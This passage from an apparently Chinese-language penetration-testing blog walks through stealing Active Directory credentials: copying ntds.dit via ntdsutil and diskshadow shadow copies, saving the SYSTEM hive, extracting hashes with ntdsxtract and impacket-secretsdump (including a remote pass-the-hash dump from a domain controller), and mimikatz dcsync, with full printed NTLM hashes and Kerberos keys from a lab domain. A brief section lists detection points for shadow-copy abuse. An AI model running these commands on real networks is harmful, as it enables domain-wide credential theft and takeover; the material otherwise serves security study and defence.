70   80   90  100</span><br><span class="line">          |----|----|----|----|----|----|----|----|----|----|</span><br><span class="line">          ...................................................</span><br><span class="line"></span><br><span class="line">正在复制注册表文件...</span><br><span class="line">正在复制 c:\demo\registry\SYSTEM</span><br><span class="line">正在复制 c:\demo\registry\SECURITY</span><br><span class="line">快照 &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125; 已卸载。</span><br><span class="line">在 c:\demo 中成功创建 IFM 媒体。</span><br><span class="line">ifm: quit</span><br><span class="line">ntdsutil: quit</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure><p><code>在Active Directory目录下可以看到ntds.dit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\demo\Active Directory&gt;dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 FC34-99CE</span><br><span class="line"></span><br><span class="line"> C:\demo\Active Directory 的目录</span><br><span class="line"></span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          .</span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          ..</span><br><span class="line">2021/09/04  18:35        25,165,824 ntds.dit</span><br><span class="line">2021/09/04  18:35            16,384 ntds.jfm</span><br><span class="line">               2 个文件     25,182,208 字节</span><br><span class="line">               2 个目录 52,228,857,856 可用字节</span><br><span class="line"></span><br><span class="line">C:\demo\Active Directory&gt;</span><br></pre></td></tr></table></figure><p><code>SYSTEM与SECURITY在registry目录下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\demo\registry&gt;dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 FC34-99CE</span><br><span class="line"></span><br><span class="line"> C:\demo\registry 的目录</span><br><span class="line"></span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          .</span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          ..</span><br><span class="line">2021/07/22  14:23            65,536 SECURITY</span><br><span class="line">2021/07/22  14:23        18,087,936 SYSTEM</span><br><span class="line">               2 个文件     18,153,472 字节</span><br><span class="line">               2 个目录 52,219,453,440 可用字节</span><br><span class="line"></span><br><span class="line">C:\demo\registry&gt;</span><br></pre></td></tr></table></figure><p><code>删除</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir /s /q demo</span><br></pre></td></tr></table></figure><p><code>nishang中的copy-vss.ps1脚本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\test&gt; Import-Module .\Copy-VSS.ps1</span><br><span class="line">PS C:\test&gt; Copy-VSS</span><br><span class="line">已复制         1 个文件。</span><br><span class="line">已复制         1 个文件。</span><br><span class="line">已复制         1 个文件。</span><br><span class="line">PS C:\test&gt;</span><br></pre></td></tr></table></figure><h3 id="5-使用diskshadow导出ntds-dit"><a href="#5-使用diskshadow导出ntds-dit" class="headerlink" title="5.使用diskshadow导出ntds.dit"></a>5.使用diskshadow导出ntds.dit</h3><p><code>首先进入diskshadow</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;diskshadow</span><br></pre></td></tr></table></figure><p><code>设置卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br></pre></td></tr></table></figure><p><code>添加卷</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add volume c: alias someAlias</span><br></pre></td></tr></table></figure><p><code>创建快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create</span><br></pre></td></tr></table></figure><p><code>分配虚拟磁盘盘符</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expose %someAlias% k:</span><br></pre></td></tr></table></figure><p><code>复制ntds.dit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;C:\Windows\System32\cmd.exe&quot; /c copy F:\Windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>删除所有快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete shadows all </span><br></pre></td></tr></table></figure><p><code>列出系统中所有的卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list shadows all</span><br></pre></td></tr></table></figure><p><code>重置</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure><p><code>退出</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">导出ntds.dit后，可以将system, hive转储。因为system.hive中存放着ntds.dit的密钥，所以如果没有该密钥，将无法查看ntds.dit中的信息</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\windows\temp\system.hive</span><br></pre></td></tr></table></figure><h3 id="6-监控卷影拷贝服务的使用情况"><a href="#6-监控卷影拷贝服务的使用情况" class="headerlink" title="6.监控卷影拷贝服务的使用情况"></a>6.监控卷影拷贝服务的使用情况</h3><p><code>通过监控卷影拷贝服务的使用情况，可以及时发现攻击者在系统中进行的一些恶意操作。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监控卷影拷贝服务及任何涉及活动目录数据库文件(ntds.dit)的可疑操作行为。</span><br><span class="line">监控System Event ID 7036(卷影拷贝服务进人运行状态的标志)的可疑实例，以及创建vssvc.exe进程的事件。</span><br><span class="line">监控创建dkshndko.exe及相关子进程的事件。</span><br><span class="line">监控客户端设备中的diskshadow.exe实例创建事件。除非业务需要， 在Windows操作系统中不应该出现diskshadow.exe.如果发现，应立刻将其删除。</span><br><span class="line">通过日志监控新出现的逻辑驱动器映射事件。</span><br></pre></td></tr></table></figure><h2 id="0x02-导出ntds-dit中的散列值"><a href="#0x02-导出ntds-dit中的散列值" class="headerlink" title="0x02.导出ntds.dit中的散列值"></a>0x02.导出ntds.dit中的散列值</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实验环境为kali，将导出的ntds.dit放入kali中进行解析</span><br></pre></td></tr></table></figure><h3 id="1-使用esedbexport恢复ntds-dit"><a href="#1-使用esedbexport恢复ntds-dit" class="headerlink" title="1.使用esedbexport恢复ntds.dit"></a>1.使用esedbexport恢复ntds.dit</h3><h4 id="01-导出ntds-dit"><a href="#01-导出ntds-dit" class="headerlink" title="01.导出ntds.dit"></a>01.导出ntds.dit</h4><p><code>安装依赖</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install autoconf automake autopoint libtool pkg-config -y</span><br></pre></td></tr></table></figure><p><code>安装libesedb</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install </span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure><p><code>安装成功之后，/usr/local/bin目录下就可以看到esedbexport</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/local/bin]</span><br><span class="line">└─# ls      </span><br><span class="line">chardetect  esedbexport  esedbinfo  nokogiri  pip  pip2  pip2.7  pip3  pip3.9  ssr  wheel</span><br></pre></td></tr></table></figure><p><code>提取表信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure><p><code>导出表信息，本实验只需要datatable和link_table</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/demo]└─# lsntds.dit  ntds.dit.export                                                                                                                                    ┌──(root💀kali)-[~/demo]└─# cd ntds.dit.export                                                                                                                                   ┌──(root💀kali)-[~/demo/ntds.dit.export]└─# ls -l 总用量 12772-rw-r--r-- 1 root root 12551192  9月  4 21:15 datatable.4-rw-r--r-- 1 root root      728  9月  4 21:15 hiddentable.6-rw-r--r-- 1 root root      263  9月  4 21:15 link_history_table.10-rw-r--r-- 1 root root     7612  9月  4 21:15 link_table.5-rw-r--r-- 1 root root      310  9月  4 21:15 MSysDefrag2.11-rw-r--r-- 1 root root     1342  9月  4 21:15 MSysLocales.3-rw-r--r-- 1 root root   102401  9月  4 21:15 MSysObjects.0-rw-r--r-- 1 root root   102401  9月  4 21:15 MSysObjectsShadow.1-rw-r--r-- 1 root root     1826  9月  4 21:15 MSysObjids.2-rw-r--r-- 1 root root       80  9月  4 21:15 quota_rebuild_progress_table.13-rw-r--r-- 1 root root      969  9月  4 21:15 quota_table.12-rw-r--r-- 1 root root       14  9月  4 21:15 sdpropcounttable.9-rw-r--r-- 1 root root      110  9月  4 21:15 sdproptable.7-rw-r--r-- 1 root root   265165  9月  4 21:15 sd_table.8</span><br></pre></td></tr></table></figure><h4 id="02-导出散列值"><a href="#02-导出散列值" class="headerlink" title="02.导出散列值"></a>02.导出散列值</h4><p><code>安装ntdsxtract</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 setup.py build &amp;&amp; python2 setup.py install</span><br></pre></td></tr></table></figure><p><code>安装依赖包</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install --upgrade pippip2 install --upgrade setuptoolspip2 install cryptohash -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><p><code>将ntds.dit.export与SYSTEM一起放入到ntdsxtract-master中</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Downloads/ntdsxtract-master]└─# lsbuild           dsdeletedobjects.py   dsgroups.py  dstimeline.py  framework  ntds             README.md          setup.pydscomputers.py  dsfileinformation.py  dskeytab.py  dsusers.py     LICENSE    ntds.dit.export  release_notes.txt  SYSTEM</span><br></pre></td></tr></table></figure><p><code>导出域内所有用户名及散列值到all_user.txt中</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt</span><br></pre></td></tr></table></figure><p><code>ntds.dit包含域内所有信息，导出域内计算机信息及其他信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dscomputers.py ntds.dit.export/datatable.4 computer_output --csvoutfile all_computers.csv</span><br></pre></td></tr></table></figure><h3 id="2-impacket工具包导出散列值"><a href="#2-impacket工具包导出散列值" class="headerlink" title="2.impacket工具包导出散列值"></a>2.impacket工具包导出散列值</h3><p><code>安装impacket</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><p><code>导出ntds.dit中的所有散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p>z<code>结果如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/demo]</span><br><span class="line">└─# impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</span><br><span class="line">Impacket v0.9.24.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xb573c235e22349ac34c6b9fb85f04363</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: e7ce10bc36bf8798dca6330d1b6f5c9c</span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:95785d2646d400e65856dda9b2098ef7:::</span></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b50c75c3bccc9a1e0ba374ca414e020b:::</span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:1119:aad3b435b51404eeaad3b435b51404ee:7cb84a0f8d0ea4090bc81c78d977b042:::</span></span><br><span class="line">jiye.net\win7dc1:1120:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:1121:aad3b435b51404eeaad3b435b51404ee:d29787a45cf23fc7eea9aba43db45573:::</span></span><br><span class="line">jiye.net\win7dc2:1122:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line">[*] Kerberos keys from ntds.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:9f70a9c7a7cda474382258797785735c</span><br><span class="line">Administrator:des-cbc-md5:fb2fd562effd3bf4</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes256-cts-hmac-sha1-96:75a78ee4a2a233b64f011ff53db48fa698f5c5a7c334d87f846ed9c62527bc7f</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes128-cts-hmac-sha1-96:95c0dcafebeed5bb96f9f047f1a87395</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:des-cbc-md5:64df192385765e7a</span></span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:80595e0a8851c759f9f6bafc90444d92e007ff6c42fdebfada30380fedf8d4e5</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:eaf969259d80eb0c6b5b42e76853bdc3</span><br><span class="line">krbtgt:des-cbc-md5:61febc5732805e40</span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes256-cts-hmac-sha1-96:05866346f711c19c29a4d51c00b1772e597ca767ac8b150ffa3121310f3059f5</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes128-cts-hmac-sha1-96:761c738f3fd1093105eb278a6d2874ac</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:des-cbc-md5:52d351c845e6fed5</span></span><br><span class="line">jiye.net\win7dc1:aes256-cts-hmac-sha1-96:f9275ead3cc2a56166367723c508e91b65a6c8901a2acbe2e2a7655ac341dac2</span><br><span class="line">jiye.net\win7dc1:aes128-cts-hmac-sha1-96:f7f8736469948de9f1ab3ef2fc25e00a</span><br><span class="line">jiye.net\win7dc1:des-cbc-md5:da37203dbf4c02b9</span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes256-cts-hmac-sha1-96:8e4af88a03181301fa67c4e0ef99c63b8d89d74e5d487295e566a06ccc1e1bae</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes128-cts-hmac-sha1-96:3ba25a6d28d57809f3f6a05269879786</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:des-cbc-md5:1964a1514c73e39d</span></span><br><span class="line">jiye.net\win7dc2:aes256-cts-hmac-sha1-96:f0bb35503c3d2d09d895153fcf39628d2b53476986e43a25a3b8a8a36dc5404a</span><br><span class="line">jiye.net\win7dc2:aes128-cts-hmac-sha1-96:fda04eb8d4b5a7686908c56f492bf948</span><br><span class="line">jiye.net\win7dc2:des-cbc-md5:981f852f29c876ea</span><br><span class="line">[*] Cleaning up... </span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/demo]</span><br></pre></td></tr></table></figure><p><code>impacket还可以通过用户名和散列值进行验证，从远程域控制器中读取ntds.dit并转储域散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448 -just-dc jiye.net/Administrator@10.10.10.10</span><br></pre></td></tr></table></figure><p><code>结果如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/demo]</span><br><span class="line">└─# impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448 -just-dc jiye.net/Administrator@10.10.10.10</span><br><span class="line">Impacket v0.9.24.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b50c75c3bccc9a1e0ba374ca414e020b:::</span><br><span class="line">jiye.net\win7dc1:1120:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line">jiye.net\win7dc2:1122:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:242fc96ac0093f6ad49c36cf0f62d617:::</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:1119:aad3b435b51404eeaad3b435b51404ee:efc572c9a568335f411a5ce0c3bfd073:::</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:1121:aad3b435b51404eeaad3b435b51404ee:d29787a45cf23fc7eea9aba43db45573:::</span></span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:9f70a9c7a7cda474382258797785735c</span><br><span class="line">Administrator:des-cbc-md5:fb2fd562effd3bf4</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:80595e0a8851c759f9f6bafc90444d92e007ff6c42fdebfada30380fedf8d4e5</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:eaf969259d80eb0c6b5b42e76853bdc3</span><br><span class="line">krbtgt:des-cbc-md5:61febc5732805e40</span><br><span class="line">jiye.net\win7dc1:aes256-cts-hmac-sha1-96:f9275ead3cc2a56166367723c508e91b65a6c8901a2acbe2e2a7655ac341dac2</span><br><span class="line">jiye.net\win7dc1:aes128-cts-hmac-sha1-96:f7f8736469948de9f1ab3ef2fc25e00a</span><br><span class="line">jiye.net\win7dc1:des-cbc-md5:da37203dbf4c02b9</span><br><span class="line">jiye.net\win7dc2:aes256-cts-hmac-sha1-96:f0bb35503c3d2d09d895153fcf39628d2b53476986e43a25a3b8a8a36dc5404a</span><br><span class="line">jiye.net\win7dc2:aes128-cts-hmac-sha1-96:fda04eb8d4b5a7686908c56f492bf948</span><br><span class="line">jiye.net\win7dc2:des-cbc-md5:981f852f29c876ea</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes256-cts-hmac-sha1-96:08470983168e2132c6af4a329fcc1ee554eee64c9bdb359e1a4e3153696701c2</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes128-cts-hmac-sha1-96:cb96a8244fba00d8f31ac7ab74a3ebe7</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:des-cbc-md5:25087a044ce631ba</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes256-cts-hmac-sha1-96:6d873f6d8dec69c829aae8393ccb0b789d78772a484de920eaac9452b2d891b9</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes128-cts-hmac-sha1-96:dd0308b5e2bf08f654c8a08e0adde90d</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:des-cbc-md5:45baf4bcf8386d7c</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes256-cts-hmac-sha1-96:8e4af88a03181301fa67c4e0ef99c63b8d89d74e5d487295e566a06ccc1e1bae</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes128-cts-hmac-sha1-96:3ba25a6d28d57809f3f6a05269879786</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:des-cbc-md5:1964a1514c73e39d</span></span><br><span class="line">[*] Cleaning up... </span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/demo]</span><br><span class="line">└─# </span><br></pre></td></tr></table></figure><h3 id="3-windows下解析ntds-dit并导出域账号和域散列值"><a href="#3-windows下解析ntds-dit并导出域账号和域散列值" class="headerlink" title="3.windows下解析ntds.dit并导出域账号和域散列值"></a>3.windows下解析ntds.dit并导出域账号和域散列值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -s SYSTEM</span><br></pre></td></tr></table></figure><h2 id="0x03-使用dcsync获取域散列值"><a href="#0x03-使用dcsync获取域散列值" class="headerlink" title="0x03.使用dcsync获取域散列值"></a>0x03.使用dcsync获取域散列值</h2><h3 id="1-mimikatz中的dcsync功能（需要域管理员权限）"><a href="#1-mimikatz中的dcsync功能（需要域管理员权限）" class="headerlink" title="1.mimikatz中的dcsync功能（需要域管理员权限）"></a>1.mimikatz中的dcsync功能（需要域管理员权限）</h3><p><code>获取所有用户名即散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:jiye.net /all /csv</span><br></pre></td></tr></table></figure><p><code>结果如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::dcsync /domain:jiye.net /all /csv</span><br><span class="line">[DC] &#x27;jiye.net&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC.jiye.net&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;jiye.net&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  b50c75c3bccc9a1e0ba374ca414e020b        514</span><br><span class="line">1120    win7dc1 316c43afcf1cede6f5d8aa6c2ce1b7d5        66048</span><br><span class="line">1121    WIN7DC2$        d29787a45cf23fc7eea9aba43db45573        4096</span><br><span class="line">1122    win7dc2 316c43afcf1cede6f5d8aa6c2ce1b7d5        66048</span><br><span class="line">500     Administrator   ae0597dc61a5c66b3a0600c60044c448        66048</span><br><span class="line">1119    WIN7DC1$        efc572c9a568335f411a5ce0c3bfd073        4096</span><br><span class="line">1000    DC$     242fc96ac0093f6ad49c36cf0f62d617        532480</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure><p><code>获取单个用户的散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:jiye.net /user:Administrator</span><br></pre></td></tr></table></figure><p><code>结果如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::dcsync /domain:jiye.net /user:Administrator</span><br><span class="line">[DC] &#x27;jiye.net&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC.jiye.net&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;Administrator&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   : 1601/1/1 